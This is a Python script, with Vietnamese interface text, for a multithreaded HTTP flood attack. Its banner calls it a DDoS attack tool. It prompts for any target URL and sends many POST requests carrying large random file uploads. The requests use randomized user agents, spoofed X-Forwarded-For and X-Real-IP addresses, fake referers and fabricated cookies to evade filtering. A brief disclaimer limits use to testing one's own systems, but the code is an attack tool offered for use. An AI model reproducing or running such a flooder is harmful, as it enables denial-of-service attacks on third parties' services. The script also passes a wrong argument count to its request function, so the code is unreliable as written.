import requests
import random
import time
import ipaddress
import string
import threading
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import os
import platform

if platform.system() != "Windows":
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
else:
    RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = UNDERLINE = END = ""

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    width = 70
    title = "CÔNG CỤ TẤN CÔNG DDoS ĐA LUỒNG"
    version = "Phiên bản: 2.0 - Quoc Tin Ly Tran"

    def center_text(text, width):
        padding = (width - len(text)) // 2
        return f"{' ' * padding}{text}{' ' * (width - len(text) - padding)}"

    banner = f"""
{BOLD}{RED}╔{'═' * (width-2)}╗
║{' ' * (width-2)}║
║{center_text(title, width-2)}║
║{' ' * (width-2)}║
║{center_text(version, width-2)}║
║{' ' * (width-2)}║
╚{'═' * (width-2)}╝{END}
    """
    print(banner)

def print_menu():
    print(f"{YELLOW}{'='*70}{END}")
    print(f"{YELLOW}[{RED}!{YELLOW}] {WHITE}CHÚ Ý: Chỉ sử dụng công cụ này với mục đích kiểm thử hệ thống của bạn{END}")
    print(f"{YELLOW}[{RED}!{YELLOW}] {WHITE}Sử dụng công cụ này vào mục đích tấn công có thể vi phạm pháp luật{END}")
    print(f"{YELLOW}{'='*70}{END}\n")

def print_status_header():
    print(f"\n{CYAN}{'='*70}")
    print(f"| {'TRẠNG THÁI TẤN CÔNG':^66} |")
    print(f"{'='*70}{END}\n")

def print_result(duration, num, success_count, failed_count):
    requests_per_second = num / duration if duration > 0 else 0
    
    print(f"\n{GREEN}{'='*70}")
    print(f"| {'KẾT QUẢ TẤN CÔNG':^66} |")
    print(f"{'='*70}{END}")
    
    print(f"{BOLD}> Tổng số request:{END} {num}")
    print(f"{BOLD}> Request thành công:{END} {GREEN}{success_count}{END}")
    print(f"{BOLD}> Request thất bại:{END} {RED}{failed_count}{END}")
    print(f"{BOLD}> Thời gian thực hiện:{END} {YELLOW}{duration:.2f}{END} giây")
    print(f"{BOLD}> Tốc độ trung bình:{END} {CYAN}{requests_per_second:.2f}{END} request/giây")
    
    print(f"\n{GREEN}{'='*70}{END}")

def load_user_agents(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"{RED}Lỗi khi đọc file user-agent: {e}{END}")
        return [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15'
        ]

def generate_random_ip():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))

def generate_headers():
    user_agents = load_user_agents('/home/quoctin/CodePython/Test/user-agent.txt')
    
    referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.facebook.com/',
        'https://www.twitter.com/',
        'https://www.instagram.com/',
        'https://www.reddit.com/',
        'https://www.youtube.com/',
        'https://www.amazon.com/',
        'https://www.linkedin.com/',
        'https://www.baidu.com/',
        'https://www.yahoo.com/',
        f'https://{random.choice(["www", "search", "mail"])}.{random.choice(["google", "yahoo", "bing"])}.com/search?q={random.choice(["news", "products", "services", "login"])}'
    ]
    
    accept_types = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ]
    
    accept_languages = [
        'en-US,en;q=0.9',
        'en-US,en;q=0.8,vi;q=0.5',
        'en-GB,en;q=0.9,en-US;q=0.8',
        'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'zh-CN,zh;q=0.9,en;q=0.8',
        'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7'
    ]
    
    accept_encodings = [
        'gzip, deflate, br',
        'gzip, deflate',
        'br;q=1.0, gzip;q=0.8, *;q=0.1'
    ]
    
    common_proxies = [
        generate_random_ip(),
        generate_random_ip(),
        f"{generate_random_ip()}, {generate_random_ip()}",
        f"{generate_random_ip()}, {generate_random_ip()}, {generate_random_ip()}"
    ]
    
    fake_cookies = [
        f'session_id={random.randint(10000, 99999)}; user_id={random.randint(1000, 9999)}; _ga=GA1.2.{random.randint(1000000, 9999999)}.{random.randint(1000000, 9999999)}',
        f'_fbp=fb.1.{int(time.time())}.{random.randint(1000000, 9999999)}; _gid=GA1.2.{random.randint(1000000, 9999999)}.{random.randint(1000000, 9999999)}',
        f'PHPSESSID={random.randint(100000, 999999)}; wordpress_logged_in_{random.randint(10000, 99999)}={random.randint(1000000, 9999999)}'
    ]
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': random.choice(accept_types),
        'Accept-Language': random.choice(accept_languages),
        'Accept-Encoding': random.choice(accept_encodings),
        'Referer': random.choice(referers),
        'X-Forwarded-For': random.choice(common_proxies),
        'X-Real-IP': generate_random_ip(),
        'Connection': random.choice(['keep-alive', 'close']),
        'Pragma': random.choice(['no-cache', 'max-age=0']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store, must-revalidate']),
    }
    
    if random.random() < 0.7:
        headers['Cookie'] = random.choice(fake_cookies)
    
    optional_headers = {
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'image', 'style', 'script', 'empty']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors', 'same-origin']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'same-site', 'cross-site', 'none']),
        'Sec-Fetch-User': random.choice(['?1', '']),
        'TE': 'trailers',
        'DNT': random.choice(['1', '0']),
        'Content-Type': random.choice(['application/x-www-form-urlencoded', 'multipart/form-data', 'application/json'])
    }
    
    for header, value in optional_headers.items():
        if random.random() < 0.6:
            headers[header] = value
    
    return headers

def generate_file(size):
    content = ''.join(random.choice(string.ascii_letters) for _ in range(size))
    return {'file': ('test.txt', content)}

success_count = 0
failed_count = 0
request_lock = threading.Lock()  
progress_bar = None 

def make_request(url, size_of_file):
    global success_count, failed_count
    
    try:
        res = requests.post(
            url, 
            files=generate_file(size_of_file), 
            headers=generate_headers(),
            timeout=5
        )
        
        with request_lock:
            if res.status_code == 200:
                success_count += 1
            else:
                failed_count += 1
                
    except requests.exceptions.RequestException:
        with request_lock:
            failed_count += 1

def test_server_when_ddos_attack_was_set(url, num=10000, size_of_file=1000000, max_workers=50):
    global success_count, failed_count, progress_bar
    success_count = 0
    failed_count = 0
    
    print(f"\n{BLUE}[*] {WHITE}Khởi tạo tấn công với {BOLD}{max_workers}{END} {WHITE}luồng đồng thời...{END}")
    print(f"{BLUE}[*] {WHITE}Mục tiêu: {BOLD}{url}{END}")
    print(f"{BLUE}[*] {WHITE}Kích thước file: {BOLD}{size_of_file}{END} {WHITE}bytes{END}")
    print(f"{BLUE}[*] {WHITE}Số lần tấn công: {BOLD}{num}{END}")
    
    time.sleep(2)  
    print_status_header()
    
    start_time = time.time()
    
    progress_bar = tqdm(
        total=num,
        desc=f"{GREEN}Tiến trình{END}",
        unit=" req",
        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
    )
    
    monitor_thread = threading.Thread(target=monitor_progress, daemon=True)
    monitor_thread.start()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(make_request, url, size_of_file, i) for i in range(num)]
        
        for future in futures:
            future.result()
            progress_bar.update(1)
    
    duration = time.time() - start_time
    progress_bar.close()
    
    print_result(duration, num, success_count, failed_count)
    
    return success_count, failed_count

def monitor_progress():
    global progress_bar
    
    last_success = 0
    last_failed = 0
    last_time = time.time()
    
    while progress_bar is not None and not progress_bar.disable:
        time.sleep(1)
        current_time = time.time()
        with request_lock:
            current_success = success_count
            current_failed = failed_count
            
        new_success = current_success - last_success
        new_failed = current_failed - last_failed
        elapsed = current_time - last_time
        rate = (new_success + new_failed) / elapsed if elapsed > 0 else 0
        
        progress_bar.set_postfix({
            "thành công": f"{GREEN}{current_success}{END}", 
            "thất bại": f"{RED}{current_failed}{END}", 
            "tốc độ": f"{CYAN}{rate:.1f}{END} req/s"
        }, refresh=True)
        
        last_success = current_success
        last_failed = current_failed
        last_time = current_time

if __name__ == "__main__":
    try:
        clear_screen()
        print_banner()
        print_menu()
        
        target_url = input(f"{BLUE}[?]{END} Nhập URL của server: {BOLD}")
        print(END, end="")
        
        try:
            file_size = int(input(f"{BLUE}[?]{END} Nhập kích thước file (bytes) [{BOLD}1000{END}]: {BOLD}") or "1000")
            print(END, end="")
        except ValueError:
            file_size = 1000
            print(f"{YELLOW}[!]{END} Giá trị không hợp lệ, sử dụng kích thước mặc định: {BOLD}1000{END} bytes")
        
        try:
            attack_times = int(input(f"{BLUE}[?]{END} Nhập số lần tấn công [{BOLD}100{END}]: {BOLD}") or "100")
            print(END, end="")
        except ValueError:
            attack_times = 100
            print(f"{YELLOW}[!]{END} Giá trị không hợp lệ, sử dụng số lần mặc định: {BOLD}100{END}")
        
        try:
            threads = int(input(f"{BLUE}[?]{END} Nhập số luồng đồng thời [{BOLD}20{END}]: {BOLD}") or "20")
            print(END, end="")
        except ValueError:
            threads = 20
            print(f"{YELLOW}[!]{END} Giá trị không hợp lệ, sử dụng số luồng mặc định: {BOLD}20{END}")
        
        confirm = input(f"\n{RED}[!]{END} Bạn có chắc chắn muốn bắt đầu tấn công? (y/N): ").lower()
        if confirm != "y":
            print(f"\n{YELLOW}[*]{END} Đã hủy tấn công.")
            exit(0)
        
        s, f = test_server_when_ddos_attack_was_set(target_url, num=attack_times, size_of_file=file_size, max_workers=threads)
        
        print(f"\n{GREEN}[✓]{END} Tấn công hoàn tất. Thành công: {GREEN}{s}{END}, Thất bại: {RED}{f}{END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!]{END} Đã hủy tấn công bởi người dùng.")
    except Exception as e:
        print(f"\n{RED}[X] Lỗi không xác định: {e}{END}")
    finally:
        print(f"\n{BLUE}[*]{END} Kết thúc chương trình.")